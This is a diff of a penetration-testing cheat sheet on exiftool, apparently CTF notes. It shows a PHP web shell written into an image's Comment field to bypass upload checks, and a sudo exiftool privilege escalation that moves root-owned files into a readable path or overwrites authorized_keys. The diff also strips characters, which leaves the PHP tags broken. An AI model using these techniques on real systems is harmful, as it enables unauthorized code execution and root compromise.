@@ -53,7 +53,7 @@ exiftool -all= -overwrite_original file.jpg
 
 ### Write metadata (useful for bypassing server-side checks)
 ```bash
-exiftool -Comment='<?php system($_GET["c"]); ?>' shell.jpg
+exiftool -Comment='<php system($_GET["c"]); >' shell.jpg
 ```
 
 ### `sudo exiftool` privesc — direct file move (no CVE needed)
@@ -62,7 +62,7 @@ sudo -l
 # (root) NOPASSWD: /usr/bin/exiftool *
 
 sudo exiftool -filename=/home/stux/root.txt /root/root.txt   # [USED — cmspit]
-cat /home/stux/root.txt                                       # ? root flag
+cat /home/stux/root.txt                                       #  root flag
 ```
 The `-filename=` flag *renames* the source file under the elevated privileges. Move root-only files into a path you can read, or overwrite a high-value file (`/root/.bashrc`, `~/.ssh/authorized_keys`). Full chain in [exiftool-sudo-cve-2021-22204.md](../../privesc/linux/exiftool-sudo-cve-2021-22204.md).
 
